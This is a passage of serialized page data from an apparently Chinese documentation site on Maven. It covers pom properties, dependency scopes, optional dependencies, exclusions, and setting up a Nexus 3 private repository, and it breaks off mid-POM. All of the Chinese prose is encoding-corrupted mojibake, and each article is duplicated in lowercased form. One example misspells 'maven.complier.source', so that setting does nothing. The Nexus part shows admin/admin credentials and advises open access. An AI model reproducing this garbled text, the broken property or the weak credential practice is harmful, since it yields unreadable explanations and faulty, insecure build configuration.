æç´¢è¯¥é¡¹ç®çç¶çº§çç»å®è·¯å¾ï¼ç¶ååæç´¢æ¬å°åè¿ç¨å­å¨åºï¼åæ ç­¾ä¸ºé»è®¤ä»å½å pom.xml çç¶çº§ç®å½æ¥æ¾ã\n\n\n# properties æ ç­¾è¯¦è§£\n\n<properties></properties> æ²¡ææä¾ä»ä¹å®è´¨æ§çåå®¹ä¾æä»¬ä½¿ç¨ï¼æ£æ¥ä¸æ¥å¨éé¢æå¤å¯ä»¥å¨æè¿°ä¸ä¸ª <project></project> æ ç­¾å¯ç¨ï¼ä½ä½ç¨å¹¶ä¸æ¯ä¸å¤§ãå®éä½ç¨æ´å¤å¨äºæè¿°æä»¬ä¾èµ jar ççæ¬ç­ã\n\n<properties>\n    \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n    <java.version>17</java.version>\n    \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- å®ä¹lombokçæ¬ --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-snapshot</project.version>\n</properties>\n\x3c!-- é¡¹ç®çæ¬ --\x3e\n<version>${project.version}</version>\n\x3c!-- ä¾èµ --\x3e\n<dependencies>\n    <dependency>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"dependencies æ ç­¾è¯¦è§£",frontmatter:{title:"dependencies æ ç­¾è¯¦è§£",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/03.maven/2301.dependencies%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"01.æ¡æ¶/03.maven/2301.dependencies æ ç­¾è¯¦è§£.md",key:"v-4542ff7e",path:"/maven/2301/",headers:[{level:2,title:"scop",slug:"scop",normalizedTitle:"scop",charIndex:292},{level:2,title:"optional",slug:"optional",normalizedTitle:"optional",charIndex:3860},{level:2,title:"exclusions",slug:"exclusions",normalizedTitle:"exclusions",charIndex:4457}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"scop optional exclusions",content:'dependencies æ ç­¾ä¸åªä¼æä¸ä¸ª dependencyï¼dependency ä½ç¨äºæä»¬å¼ç¨åªäº jar æ¥ç»æä»¬æä¾æ´å¤çææ¯æ¯æãä¸è¬ç¨æ³:\n\n<dependencies>\n    <dependency>\n        <groupId>org.apache.commons</groupId>\n        <artifactId>commons-pool2</artifactId>\n        <version>2.7.0</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\næ§å¶ dependency (ä¾èµ) çä½¿ç¨èå´ãéä¿çè®²ï¼å°±æ¯æ§å¶ Jar åå¨åªäºèå´è¢«å è½½åä½¿ç¨ãä½¿ç¨æ¹å¼å¦ä¸ï¼\n\n<dependency>\n    <groupId>com.giant</groupId>\n    <artifactId>giant-core-security</artifactId>\n    <version>1.0-SNAPSHOT</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop ä¸å±æ 6 ä¸ªå¼å¯ä»¥ä½¿ç¨ï¼\n\n * compileï¼é»è®¤å¼ï¼\n   å¦ææ²¡ææå® scope å¼ï¼è¯¥åç´ çé»è®¤å¼ä¸º compileãè¢«ä¾èµï¼giant-core-securitï¼jar éè¦åä¸å°å½åé¡¹ç®çç¼è¯ï¼æµè¯ï¼æåï¼è¿è¡ç­é¶æ®µãæåçæ¶åéå¸¸ä¼åå«è¢«ä¾èµï¼giant-core-securitï¼jarã\n\n * provided\n   è¢«ä¾èµ jar çè®ºä¸å¯ä»¥åä¸ç¼è¯ãæµè¯ãè¿è¡ç­é¶æ®µï¼ç¸å½äº compileï¼ä½æ¯å¨æåé¶æ®µåäº excludeï¼æé¤ï¼ çå¨ä½ãä¾å¦ï¼ å¦ææä»¬å¨å¼åä¸ä¸ªåºç¨ï¼å¨ç¼è¯æ¶æä»¬éè¦ä¾èµ xxxx.jarï¼ä½æ¯å¨è¿è¡æ¶æä»¬ä¸éè¦è¯¥ jar åï¼å ä¸ºè¿ä¸ª jar åå·²ç±åºç¨æå¡å¨æé¡¹ç®æ¬èº«æä¾è¯¥ä¾èµï¼æ­¤æ¶æä»¬éè¦ä½¿ç¨ provided è¿è¡èå´ä¿®é¥°ã\n\n * runtime\n   è¡¨ç¤ºè¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯é¶æ®µï¼ä½æ¯ä¼åä¸å°é¡¹ç®çæµè¯åè¿è¡é¶æ®µãä¸ compile ç¸æ¯ï¼è¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯ãéç¨åºæ¯ï¼ä¾å¦ï¼å¨ç¼è¯çæ¶åæä»¬ä¸éè¦ JDBC API ç jar åï¼èå¨è¿è¡çæ¶åæä»¬æéè¦ JDBC é©±å¨åã\n\n * test\n   è¡¨ç¤ºè¢«ä¾èµé¡¹ç®ä»ä»åä¸æµè¯ç¸å³çå·¥ä½ï¼åæ¬æµè¯ä»£ç çç¼è¯ï¼æ§è¡ãéç¨åºæ¯ï¼ä¾å¦ï¼Junit æµè¯ã\n\n * system\n   system åç´ ä¸ provided åç´ ç±»ä¼¼ï¼ä½æ¯è¢«ä¾èµ jar ä¸ä¼ä» maven ä»åºä¸­æ¥æ¾ï¼èæ¯ä»æ¬å°ç³»ç»ä¸­è·åï¼systemPath åç´ ç¨äºå¶å®æ¬å°ç³»ç»ä¸­ jar æä»¶çè·¯å¾ãä¾å¦ï¼\n\n<dependency>\n    <groupId>sleepycat</groupId>\n    <artifactId>je</artifactId>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systemPath>${project.basedir}/lib/je-7.0.6.jar</systemPath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   å®åªä½¿ç¨å¨ <dependencyManagement> ä¸­ï¼è¡¨ç¤ºä»å¶å®ç pom ä¸­å¯¼å¥ dependency çéç½®ï¼ä¾å¦ï¼B é¡¹ç®å¯¼å¥ A é¡¹ç®ä¸­çåéç½®ï¼ãä¼æå¨ç¥ï¼å½æä»¬åå»ºä¸ä¸ª SpringBoot é¡¹ç®æ¶ï¼æä»¬ä¸å®ä¼åä¸ä¸ª <parent> æ¥ç»§æ¿ spring ææä¾çææä¾èµï¼ä½å¦ææåæ³ä½¿ç¨ spring æä¾çä¾èµï¼åæ³ç»§æ¿æèªå·±çé¡¹ç®ï¼æ­¤æ¶ import å°±æäºç¨æ­¦ä¹å°\n\n# æ®é SpringBoot ä¾èµ\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.6.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## æ´æ¢ç»§æ¿é¡¹ç®ï¼å¹¶ä½¿ç¨springboot ä¾èµ\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- åä¸ºæèªå·±çç¶é¡¹ç® --\x3e\n    <parent>\n        <groupId>com.giant.parent</groupId>\n        <artifactId>boot-parent</artifactId>\n        <version>1.0-SNAPSHOT</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot ä¾èµ --\x3e\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-parent</artifactId>\n                <version>2.2.6.RELEASE</version>\n                \x3c!-- éè¦æææ¶pomè¿æ¯jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional æ¯ maven ä¾èµ jar æ¶çä¸ä¸ªéé¡¹ï¼è¡¨ç¤ºè¯¥ä¾èµæ¯å¯éçï¼ä¸ä¼è¢«ä¾èµä¼ éãä¾å¦ï¼B ä¾èµäºæ¥å¿æ¡æ¶ logbackãlog4jãapache commons logï¼è¿æ¶å A å¼ç¨ B ç jarï¼å ä¸º maven æä¾èµä¼ éæºå¶ï¼é£ä¹ A é¡¹ç®å°±ä¼æ 3 ä¸ª jar åï¼logbackãlog4jãapache commons logãå®éä¸æä»¬ä¸è¬åªä¼å¨é¡¹ç®ä¸­ä½¿ç¨ä¸ç§æ¥å¿æ¡æ¶ï¼é£ä¹æä»¬é¡¹ç®ä¸­å°±ä¼æå¤ä½çä¾èµï¼å½è¿ç§æåµæ¶è¶æ¥è¶å¤æ¶ï¼æåæ´ä¸ªé¡¹ç®ç jar åå°±æå¾å¤çå¤ä½ä¾èµï¼å¯¼è´é¡¹ç®å¾èè¿ã\n\nå¯¹äºè¿ç§æåµï¼æä»¬åªè¦å¨ B é¡¹ç®ä¸­æ logbackãlog4jãapache commons log è®¾ç½®æ <optional>true</optional> çå³å¯ãè¿æ¶å A é¡¹ç®ä¾èµ B çæ¶åï¼é¡¹ç®ä¸­ä¸ä¼æ logbackãlog4jãapache commons log ç¸å³ jar åï¼å¯ä»¥æ ¹æ®æåµèªè¡éæ©ä¸ä¸ªå³å¯ã\n\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\nç¨äºæé¤ä¾èµé¡¹ä¸­ï¼ä¸éè¦æ·»å ç jarï¼æèä½¿ç¨èªå·±çæ¬ç jar èä¸éç¨å¶ä»äººææä¾ç jarãå¦ï¼å¼ç¨ç spring-boot-starter-data-redis ä¼å¸®æä»¬ä¾èµ slf4j-apiï¼ä½å®ä½¿ç¨ççæ¬è¢«çåºäº bugï¼é£æè¦åçº§å°æ´é«çæ¬ï¼å¼å¥èªå·±éä¸­ççæ¬ã\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n    <version>2.2.6.RELEASE</version>\n    <exclusions>\n        \x3c!-- æé¤spring-boot-starter-data-redisèªå¸¦ç slf4j --\x3e\n        <exclusion>\n            <groupId>org.slf4j</groupId>\n            <artifactId>slf4j-api</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- å¼ç¨æ´æ¹çæ¬çslf4j --\x3e\n<dependency>\n    <groupId>org.slf4j</groupId>\n    <artifactId>slf4j-api</artifactId>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'dependencies æ ç­¾ä¸åªä¼æä¸ä¸ª dependencyï¼dependency ä½ç¨äºæä»¬å¼ç¨åªäº jar æ¥ç»æä»¬æä¾æ´å¤çææ¯æ¯æãä¸è¬ç¨æ³:\n\n<dependencies>\n    <dependency>\n        <groupid>org.apache.commons</groupid>\n        <artifactid>commons-pool2</artifactid>\n        <version>2.7.0</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\næ§å¶ dependency (ä¾èµ) çä½¿ç¨èå´ãéä¿çè®²ï¼å°±æ¯æ§å¶ jar åå¨åªäºèå´è¢«å è½½åä½¿ç¨ãä½¿ç¨æ¹å¼å¦ä¸ï¼\n\n<dependency>\n    <groupid>com.giant</groupid>\n    <artifactid>giant-core-security</artifactid>\n    <version>1.0-snapshot</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop ä¸å±æ 6 ä¸ªå¼å¯ä»¥ä½¿ç¨ï¼\n\n * compileï¼é»è®¤å¼ï¼\n   å¦ææ²¡ææå® scope å¼ï¼è¯¥åç´ çé»è®¤å¼ä¸º compileãè¢«ä¾èµï¼giant-core-securitï¼jar éè¦åä¸å°å½åé¡¹ç®çç¼è¯ï¼æµè¯ï¼æåï¼è¿è¡ç­é¶æ®µãæåçæ¶åéå¸¸ä¼åå«è¢«ä¾èµï¼giant-core-securitï¼jarã\n\n * provided\n   è¢«ä¾èµ jar çè®ºä¸å¯ä»¥åä¸ç¼è¯ãæµè¯ãè¿è¡ç­é¶æ®µï¼ç¸å½äº compileï¼ä½æ¯å¨æåé¶æ®µåäº excludeï¼æé¤ï¼ çå¨ä½ãä¾å¦ï¼ å¦ææä»¬å¨å¼åä¸ä¸ªåºç¨ï¼å¨ç¼è¯æ¶æä»¬éè¦ä¾èµ xxxx.jarï¼ä½æ¯å¨è¿è¡æ¶æä»¬ä¸éè¦è¯¥ jar åï¼å ä¸ºè¿ä¸ª jar åå·²ç±åºç¨æå¡å¨æé¡¹ç®æ¬èº«æä¾è¯¥ä¾èµï¼æ­¤æ¶æä»¬éè¦ä½¿ç¨ provided è¿è¡èå´ä¿®é¥°ã\n\n * runtime\n   è¡¨ç¤ºè¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯é¶æ®µï¼ä½æ¯ä¼åä¸å°é¡¹ç®çæµè¯åè¿è¡é¶æ®µãä¸ compile ç¸æ¯ï¼è¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯ãéç¨åºæ¯ï¼ä¾å¦ï¼å¨ç¼è¯çæ¶åæä»¬ä¸éè¦ jdbc api ç jar åï¼èå¨è¿è¡çæ¶åæä»¬æéè¦ jdbc é©±å¨åã\n\n * test\n   è¡¨ç¤ºè¢«ä¾èµé¡¹ç®ä»ä»åä¸æµè¯ç¸å³çå·¥ä½ï¼åæ¬æµè¯ä»£ç çç¼è¯ï¼æ§è¡ãéç¨åºæ¯ï¼ä¾å¦ï¼junit æµè¯ã\n\n * system\n   system åç´ ä¸ provided åç´ ç±»ä¼¼ï¼ä½æ¯è¢«ä¾èµ jar ä¸ä¼ä» maven ä»åºä¸­æ¥æ¾ï¼èæ¯ä»æ¬å°ç³»ç»ä¸­è·åï¼systempath åç´ ç¨äºå¶å®æ¬å°ç³»ç»ä¸­ jar æä»¶çè·¯å¾ãä¾å¦ï¼\n\n<dependency>\n    <groupid>sleepycat</groupid>\n    <artifactid>je</artifactid>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systempath>${project.basedir}/lib/je-7.0.6.jar</systempath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   å®åªä½¿ç¨å¨ <dependencymanagement> ä¸­ï¼è¡¨ç¤ºä»å¶å®ç pom ä¸­å¯¼å¥ dependency çéç½®ï¼ä¾å¦ï¼b é¡¹ç®å¯¼å¥ a é¡¹ç®ä¸­çåéç½®ï¼ãä¼æå¨ç¥ï¼å½æä»¬åå»ºä¸ä¸ª springboot é¡¹ç®æ¶ï¼æä»¬ä¸å®ä¼åä¸ä¸ª <parent> æ¥ç»§æ¿ spring ææä¾çææä¾èµï¼ä½å¦ææåæ³ä½¿ç¨ spring æä¾çä¾èµï¼åæ³ç»§æ¿æèªå·±çé¡¹ç®ï¼æ­¤æ¶ import å°±æäºç¨æ­¦ä¹å°\n\n# æ®é springboot ä¾èµ\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.2.6.release</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## æ´æ¢ç»§æ¿é¡¹ç®ï¼å¹¶ä½¿ç¨springboot ä¾èµ\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- åä¸ºæèªå·±çç¶é¡¹ç® --\x3e\n    <parent>\n        <groupid>com.giant.parent</groupid>\n        <artifactid>boot-parent</artifactid>\n        <version>1.0-snapshot</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot ä¾èµ --\x3e\n    <dependencymanagement>\n        <dependencies>\n            <dependency>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-starter-parent</artifactid>\n                <version>2.2.6.release</version>\n                \x3c!-- éè¦æææ¶pomè¿æ¯jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencymanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional æ¯ maven ä¾èµ jar æ¶çä¸ä¸ªéé¡¹ï¼è¡¨ç¤ºè¯¥ä¾èµæ¯å¯éçï¼ä¸ä¼è¢«ä¾èµä¼ éãä¾å¦ï¼b ä¾èµäºæ¥å¿æ¡æ¶ logbackãlog4jãapache commons logï¼è¿æ¶å a å¼ç¨ b ç jarï¼å ä¸º maven æä¾èµä¼ éæºå¶ï¼é£ä¹ a é¡¹ç®å°±ä¼æ 3 ä¸ª jar åï¼logbackãlog4jãapache commons logãå®éä¸æä»¬ä¸è¬åªä¼å¨é¡¹ç®ä¸­ä½¿ç¨ä¸ç§æ¥å¿æ¡æ¶ï¼é£ä¹æä»¬é¡¹ç®ä¸­å°±ä¼æå¤ä½çä¾èµï¼å½è¿ç§æåµæ¶è¶æ¥è¶å¤æ¶ï¼æåæ´ä¸ªé¡¹ç®ç jar åå°±æå¾å¤çå¤ä½ä¾èµï¼å¯¼è´é¡¹ç®å¾èè¿ã\n\nå¯¹äºè¿ç§æåµï¼æä»¬åªè¦å¨ b é¡¹ç®ä¸­æ logbackãlog4jãapache commons log è®¾ç½®æ <optional>true</optional> çå³å¯ãè¿æ¶å a é¡¹ç®ä¾èµ b çæ¶åï¼é¡¹ç®ä¸­ä¸ä¼æ logbackãlog4jãapache commons log ç¸å³ jar åï¼å¯ä»¥æ ¹æ®æåµèªè¡éæ©ä¸ä¸ªå³å¯ã\n\n<dependency>\n    <groupid>org.projectlombok</groupid>\n    <artifactid>lombok</artifactid>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\nç¨äºæé¤ä¾èµé¡¹ä¸­ï¼ä¸éè¦æ·»å ç jarï¼æèä½¿ç¨èªå·±çæ¬ç jar èä¸éç¨å¶ä»äººææä¾ç jarãå¦ï¼å¼ç¨ç spring-boot-starter-data-redis ä¼å¸®æä»¬ä¾èµ slf4j-apiï¼ä½å®ä½¿ç¨ççæ¬è¢«çåºäº bugï¼é£æè¦åçº§å°æ´é«çæ¬ï¼å¼å¥èªå·±éä¸­ççæ¬ã\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-data-redis</artifactid>\n    <version>2.2.6.release</version>\n    <exclusions>\n        \x3c!-- æé¤spring-boot-starter-data-redisèªå¸¦ç slf4j --\x3e\n        <exclusion>\n            <groupid>org.slf4j</groupid>\n            <artifactid>slf4j-api</artifactid>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- å¼ç¨æ´æ¹çæ¬çslf4j --\x3e\n<dependency>\n    <groupid>org.slf4j</groupid>\n    <artifactid>slf4j-api</artifactid>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"ä½¿ç¨ Nexus3.x æ­å»ºç§æ",frontmatter:{title:"ä½¿ç¨ Nexus3.x æ­å»ºç§æ",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/03.maven/2302.%E4%BD%BF%E7%94%A8%20Nexus3.x%20%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D.html",relativePath:"01.æ¡æ¶/03.maven/2302.ä½¿ç¨ Nexus3.x æ­å»ºç§æ.md",key:"v-3ef166c4",path:"/maven/2302/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'ä¸è½½å°å https://help.sonatype.com/repomanager3/product-information/downloadï¼ä¸è½½å¥½åè¿è¡è§£åç¼©ä¼å¾å°ä¸¤ä¸ªæä»¶ï¼nexus-3.39.0-01 å sonatype-workãå¯ä»¥éç½® nexus åéå°æä»¬çç¯å¢ä¸­æ¹ä¾¿å¯å¨ï¼ä¹å¯ä»¥ä¸éç½®æ¯æ¬¡é½å° nexus-3.39.0-01/bin ä¸å»å¯å¨ã\n\nNEXUS_HOME: /opt/software/nexus3/nexus-3.39.0-01/\nPATH: %NEXUS_HOME%/bin\n\n\n1\n2\n\n\nnexus é»è®¤ä½¿ç¨çæ¯ 8081 ç«¯å£ï¼å¾å¤å¾®æå¡çç«¯å£é½ä¼ä» 8080 ç­å¼å§ä½¿ç¨ï¼å¯ä»¥ä¿®æ¹ nexus çç«¯å£ï¼å·ä½ä½ç½®æä»¶ä¸º /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\nå¯å¨ nexus å½ä»¤\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# æç¤ºä¿¡æ¯\nWARNING: ************************************************************\nWARNING: Detected execution as "root" user.  This is NOT recommended!\nWARNING: ************************************************************\n\n# è¿ä¸ªä¿¡æ¯éè¦ä¿®æ¹ /opt/software/nexus3/nexus-3.39.0-01/bin/nexus æä»¶ï¼æ¾å° run_as_root=trueï¼æ¹ä¸ºå¦ä¸\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¯å¨æååå°±å¯ä»¥ç»å½ nexus ææä¾çå®¢æ·ç«¯çé¢ï¼ç»å½çæ¶åä¼é®ä½ è¦è´¦å·å¯ç ï¼è´¦å·é»è®¤æ¯ adminï¼å¯ç å¨ /opt/software/nexus3/sonatype-work/nexus3/admin.password æä»¶ä¸­ï¼ç»å½æååä¼è¦æ±æ´æ¹å¯ç ï¼å¯ç æ´æ¹å admin.password ä¼èªå¨å é¤ãä¿®æ¹ä¼ä¼è®©ä½ éæ©ä¸¥æ ¼æ¨¡å¼ï¼å»ºè®®åè®¸ææäººè®¿é®ï¼æ¯ç«æ¯ç§ææ²¡å¤ªå¤§å¿è¦ä¸¥æ ¼ã\n\n\n\n\n\n\n\nç¹å»è®¾ç½®ãç¹å»ä»åºï¼æä»¬å¯ä»¥çå°ä»åºç®¡çéç½®åè¡¨ï¼å¶ä¸­è· Maven ç¸å³çæ 4 ä¸ªï¼Maven ç¸å¯¹æ 3 ä¸ª Type\n\n * proxyï¼è¡¨ç¤ºä¸ºä»£çä»åºï¼ä¸è½½ç»ä»¶æ¶ï¼å¦æä»£çä»åºæç´¢ä¸å°ï¼åæè¯·æ±è½¬åå°è¿ç¨ä»åºï¼é»è®¤ https://repo1.maven.org/maven2/ï¼è¯¥å°åå¯ä»¥ä¿®æ¹ï¼ï¼å¹¶ä»è¿ç¨ä»åºä¸è½½ï¼ç¶åå°è¯¥ç»ä»¶ç¼å­å°ä»£çåºï¼å½åæ¬¡è¯·æ±è¯¥ç»ä»¶æ¶ï¼åç´æ¥å°ä»£çä»åºä¸è½½ï¼ä¸ä¼åä»è¿ç¨ä»åºä¸è½½ã\n * hosted\n   è¡¨ç¤ºå®¿ä¸»ä»åºï¼ä¸»è¦ç¨æ¥é¨ç½²å¢éåé¨ç»ä»¶ï¼å¶ä¸­ maven-releases ç¨æ¥é¨ç½²å¢éåé¨çåå¸çç»ä»¶ï¼maven-snapshots ç¨æ¥é¨ç½²å¢éåé¨çå¿«ç§çç»ä»¶ã\n * group\n   è¡¨ç¤ºåç»ä»åºï¼é»è®¤å° maven-centralãmaven-releasesãmaven-snapshots ä¸ä¸ªä»åºç»åå¨ä¸èµ·å¯¹å¤æä¾æå¡ï¼ç®åäº maven å®¢æ·ç«¯å¨ setting.xml æ pom.xml çéç½®\n\nä¿®æ¹ maven-central ç proxy å°åï¼ä½ å¯ä»¥å¨åè¡¨ä¸­ç¹å» maven-centralï¼å°±ä¼è¿å° maven-central çç¼è¾é¡µï¼ç¶åå¨ Remote storage ä¿®æ¹ä¸ºé¿éäºçä»åºç¹å»ä¿å­å³å¯ã\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven æ³ä½¿ç¨æä»¬èªå·±æ­å»ºç nexusï¼åªéè¦å¨ maven-3.8.4\\conf\\settings.xml æä»¶ä¿®æ¹éåå°åå³å¯\n\n  <mirrors>\n\t\x3c!-- é¿éäº --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorOf>*</mirrorOf>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> æç§ä»¥ä¸çæä½ï¼æä»¬åªæ°å¯å¨ä¸ä¸ªé¡¹ç®ï¼å¹¶å¨é¡¹ç®ä¸­æå®è¯¥ mavenï¼æ­¤æ¶æä»¬ä¸è½½ç jar å°±ä¼ç¼å­å° nexus éï¼å½å¶ä»åäºä½¿ç¨è¯¥é¡¹ç®å°±ä¼åç°è¯¥é¡¹ç®çä¾èµä¸è½½ä¸ºæä»¬ nexus çé¨ç½²å°åã\n\nä½æ¯è¿è¿ä¸å¤ï¼å¨å®éå¼åä¸­ï¼é¤äºæä»¬æ¬èº«ä½¿ç¨çç¬¬ä¸æ¹ä¾èµå¤ï¼æä»¬èªå·±ä¹ä¼åä¸äºä¾èµåæå·¥å·åç­ï¼æ­¤æ¶è¥æ³è®©å¶ä»åäºå¯ä»¥ä¸è½½å¹¶ä¾èµä½¿ç¨ï¼æä»¬å°±éè¦ææä»¬å¶ä½ç jar åå¸å° nexus éå»ãæä»¬åè¦å¨æä»¬ç maven ç settings.xml ä¸­éç½®å¨ nexus çè´¦å·å¯ç \n\n  <servers>\n    <server>\n      \x3c!-- æ³¨æid  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¹åæä»¬åªéè¦åå»ºæä»¬ç jar å¹¶æ·»å ä¸äºéç½®å³å¯ï¼ç¸åºéç½®å¨ä»£ç ä¸­æè¯´æ\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    